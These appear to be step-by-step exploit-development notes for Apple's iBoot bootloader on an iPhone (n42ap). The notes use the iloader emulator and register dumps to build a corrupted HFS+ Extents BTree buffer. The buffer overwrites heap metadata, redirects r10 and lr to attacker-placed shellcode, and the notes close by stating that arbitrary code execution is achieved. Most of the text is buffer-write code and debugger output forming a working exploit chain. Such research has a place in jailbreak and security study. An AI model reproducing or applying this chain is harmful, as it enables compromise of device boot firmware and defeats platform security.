*search main_task, task structure

"iBoot.h"
/* make main_task show SP */
*(uint16_t *)(image + 0xDBC) = INSNT_MOV_R_R(1, 13);
*(uint8_t *)(image + 0x35264) = 'x';
/* show task structure */
*(void **)(image + 0xFCC) = image + 0x443A0;
*(uint8_t *)(image + 0x35250) = 'x';

0xdbc: mov r1, 13               : 69 46
0x35264: 'x'                    : 78
0xFCC: 0xbff00000 + 0x443A0     : a0 43 f4 bf
0x35250: 'x'                    : 78

run via kloader
=======================================
::
:: iBoot for n42ap, Copyright 2013, Apple Inc.
::
::	BUILD_TAG: bff56480 -> task structure
::
::	BUILD_STYLE: bff58254 -> main_task
::
::	USB_SERIAL_NUMBER: CPID:8950 CPRV:20 CPFM:03 SCEP:10 BDID:02 ECID:XXXXXXXXXXXXXXXX IBFL:1B SRNM:[XXXXXXXXXXXX]
::
=======================================

You need to adjust malloc so that real iBoot and iloader show the same value.

-> CALL(malloc)(0xc00)

#####################################################################################

Once you find a good hierarchy, the next step is to implement the trick to run shellcode.
Look at iBoot_f1.h, this is the source code without shellcode. Let's see how this is assembled.

*Build and run iloader
--------------------------------------------------------------------------------
_memalign: sp = 0x647d00, r8 = 0x647c60, r3 = 0x2, r2 => 0x647c90 (0x70)
_memalign: sp = 0x647d00, r0 = 0x6bad80, r1 = 0xf09 (0x6f6fc0/0xbfff6fc0), r2 = 0x6bae00, r3 = 0xc, r4 => (0x6badc0/0xbffbadc0), r9 = 0x80 (0x3c200)
_memalign: sp = 0x647d00, r8 = 0x647c60
_memalign: sp = 0x647c98, r8 = 0x647c60, r3 = 0x5, r2 => 0x647c9c (0xfffffffc)
_memalign: sp = 0x647c98, r0 = 0x647b62, r1 = 0x5 (0x647ca2/0xbff47ca2), r2 = 0x647ba8, r3 = 0x8, r4 => (0x647b68/0xbff47b68), r9 = 0x440 (0x13a)
r0  = 0x46464646 r1  = 0x0000013a r2  = 0x00647ba2 r3  = 0x00000008
r4  = 0x00647b68 r5  = 0xffffffb8 r6  = 0x00000087 r7  = 0x00647cb0
r8  = 0x00647c60 r9  = 0x00000440 r10 = 0x0061a2fd r11 = 0x00647c98
r12 = 0x00600790 sp  = 0x00647c98 lr  = 0x00002861 pc  = 0x0061a2f2
--------------------------------------------------------------------------------

[1] *r2 = r4

1) The value of r2 is 0x00647ba2. Since iloader is relocating and shifting, the actual offset value of DUMP is 0x47ba2.
2) Calculates the value obtained by subtracting the start point of Extents BTree header from 0x47ba2.

1)) r2 - relocated-addr = 0x47ba2
2)) 0x47ba2 - Extents BTree header offset = 0x4e

-> PUT_DWORD_LE(buffer, 0x4e, r4);

#####################################################################################

*Let's build and run iloader by adding the above code.
--------------------------------------------------------------------------------
_memalign: sp = 0x647d00, r8 = 0x647c60, r3 = 0x2, r2 => 0x647c90 (0x70)
_memalign: sp = 0x647d00, r0 = 0x6bad80, r1 = 0xf09 (0x6f6fc0/0xbfff6fc0), r2 = 0x6bae00, r3 = 0xc, r4 => (0x6badc0/0xbffbadc0), r9 = 0x80 (0x3c200)
_memalign: sp = 0x647d00, r8 = 0x647c60
_memalign: sp = 0x647c98, r8 = 0x647c60, r3 = 0x5, r2 => 0x647c9c (0xfffffffc)
_memalign: sp = 0x647c98, r0 = 0x647b62, r1 = 0x5 (0x647ca2/0xbff47ca2), r2 = 0x647ba8, r3 = 0x8, r4 => (0x647b68/0xbff47b68), r9 = 0x440 (0x13a)
_memalign: sp = 0x647c98, r0 = 0x647b68, r1 = 0x46464646 (0x91f60ce8/0x51860ce8), r2 = 0x647ba8, r3 = 0x8, r4 => (0x647b68/0xbff47b68), r9 = 0x440 (0x91919180)
r0  = 0x00647b68 r1  = 0x91919180 r2  = 0x00647ba8 r3  = 0x00000008
r4  = 0x00647b68 r5  = 0xffffffb8 r6  = 0x00000087 r7  = 0x00647cb0
r8  = 0x00647c60 r9  = 0x00000440 r10 = 0x46464646 r11 = 0x46464646
r12 = 0x00600790 sp  = 0x00647c98 lr  = 0x00002845 pc  = 0x0061a320
--------------------------------------------------------------------------------

[2] *(r0 + 4) = r9
Match the value of r1 with r9.

-> PUT_DWORD_LE(buffer, (0x47b68 + 4) - 0x47B54, (NODE_SIZE + 0x40) >> 6);

#####################################################################################

--------------------------------------------------------------------------------
_memalign: sp = 0x647d00, r8 = 0x647c60, r3 = 0x2, r2 => 0x647c90 (0x70)
_memalign: sp = 0x647d00, r0 = 0x6bad80, r1 = 0xf09 (0x6f6fc0/0xbfff6fc0), r2 = 0x6bae00, r3 = 0xc, r4 => (0x6badc0/0xbffbadc0), r9 = 0x80 (0x3c200)
_memalign: sp = 0x647d00, r8 = 0x647c60
_memalign: sp = 0x647c98, r8 = 0x647c60, r3 = 0x5, r2 => 0x647c9c (0xfffffffc)
_memalign: sp = 0x647c98, r0 = 0x647b62, r1 = 0x5 (0x647ca2/0xbff47ca2), r2 = 0x647ba8, r3 = 0x8, r4 => (0x647b68/0xbff47b68), r9 = 0x440 (0x13a)
_memalign: sp = 0x647c98, r0 = 0x647b68, r1 = 0x11 (0x647fa8/0xbff47fa8), r2 = 0x647ba8, r3 = 0x8, r4 => (0x647b68/0xbff47b68), r9 = 0x440 (0x440)
r0  = 0x00647b68 r1  = 0x00000440 r2  = 0x00647ba8 r3  = 0x00000008
r4  = 0x00647b68 r5  = 0xffffffb8 r6  = 0x00000087 r7  = 0x00647cb0
r8  = 0x00647c60 r9  = 0x00000440 r10 = 0x46464646 r11 = 0x46464646
r12 = 0x00600790 sp  = 0x00647c98 lr  = 0x00002841 pc  = 0x0061a320
--------------------------------------------------------------------------------

[3] r10 (code exec)

Set the start point of shellcode to r2 offset.
r2: 0x47ba8 -> r10

-> PUT_DWORD_LE(buffer, (0x47B68 + 0x40) - 0x47B54, (uintptr_t)image + (0x47BB0 + 1));

#####################################################################################
--------------------------------------------------------------------------------

_memalign: sp = 0x647d00, r8 = 0x647c60, r3 = 0x2, r2 => 0x647c90 (0x70)
_memalign: sp = 0x647d00, r0 = 0x6bad80, r1 = 0xf09 (0x6f6fc0/0xbfff6fc0), r2 = 0x6bae00, r3 = 0xc, r4 => (0x6badc0/0xbffbadc0), r9 = 0x80 (0x3c200)
_memalign: sp = 0x647d00, r8 = 0x647c60
_memalign: sp = 0x647c98, r8 = 0x647c60, r3 = 0x5, r2 => 0x647c9c (0xfffffffc)
_memalign: sp = 0x647c98, r0 = 0x647b62, r1 = 0x5 (0x647ca2/0xbff47ca2), r2 = 0x647ba8, r3 = 0x8, r4 => (0x647b68/0xbff47b68), r9 = 0x440 (0x13a)
_memalign: sp = 0x647c98, r0 = 0x647b68, r1 = 0x11 (0x647fa8/0xbff47fa8), r2 = 0x647ba8, r3 = 0x8, r4 => (0x647b68/0xbff47b68), r9 = 0x440 (0x440)
r0  = 0x00647b68 r1  = 0x00000440 r2  = 0x00647ba8 r3  = 0x00000008
r4  = 0x00647b68 r5  = 0xffffffb8 r6  = 0x00000087 r7  = 0x00647cb0
r8  = 0x00647c60 r9  = 0x00000440 r10 = 0x00647bb1 r11 = 0x46464646
r12 = 0x00600790 sp  = 0x00647c98 lr  = 0x00002839 pc  = 0x0061a320
--------------------------------------------------------------------------------

[4] r11 -> lr
Add 0x4 to the value of r7.

-> PUT_DWORD_LE(buffer, ((0x47B68 + 0x40) + 0x4) - 0x47B54, (uintptr_t)image + 0x47cb4);

Now code execution is possible from 0x47BB1. It is possible to execute arbitrary code by writing shellcode here.

Be careful here!!
iloader was relocated to 0x600000, but the actual iBoot base address is 0xbff00000.
Write patch_nettoyeur(). Make 0x84000000 indicate 0x00000000 + relocated address.
